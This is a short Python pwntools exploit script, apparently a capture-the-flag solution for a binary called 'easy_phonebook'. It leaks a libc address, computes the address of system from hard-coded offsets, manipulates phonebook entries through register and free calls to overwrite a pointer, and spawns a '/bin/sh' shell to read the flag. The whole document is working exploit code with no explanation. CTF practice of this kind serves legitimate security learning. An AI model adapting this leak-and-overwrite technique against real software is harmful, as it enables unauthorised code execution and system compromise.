from pwn import * 

#context.log_level = "debug"

s = process('./easy_phonebook')
e = ELF('./easy_phonebook')

def overflow(name, birth):
	s.sendline("1")
	s.recv()
	s.send(name)
	s.recv()
	s.send(birth)
	s.recv()

def register(name, phone_number, birth):
	s.sendline("1")
	s.recv()
	s.send(name)
	sleep(0.1)
	s.recv()
	s.send(phone_number)
	sleep(0.1)
	s.recv()
	s.send(birth)
	sleep(0.1)
	s.recv()

def show():
	s.sendline("2")
	s.recvuntil("A"*100)
	leak=u32(s.recv(4))
	print 'leak: ' + str(hex(leak))
	s.recv()
	return leak

def free(index):
	s.sendline("3")
	s.recv()
	s.sendline(index)
	s.recv()

def birth(select):
	s.sendline("4")
	s.recv()
	s.sendline(select)
	s.recv()

def exit():
	s.sendline("5")
	s.recv()

s.recv()
register("A"*100, "B"*100, "C"*100)

libc = show() - 0x5c0cb
system = libc + 0x3ada0
print 'libc: ' + str(hex(libc))
free("1")

register("/bin/sh;", "1"*8, "1"*8)
register("/bin/sh;", "1"*8, "1"*16 + p32(system))
register("/bin/sh;", "1"*8, "1"*8)

free("1")

birth("11")
s.sendline("cat flag")
s.interactive()
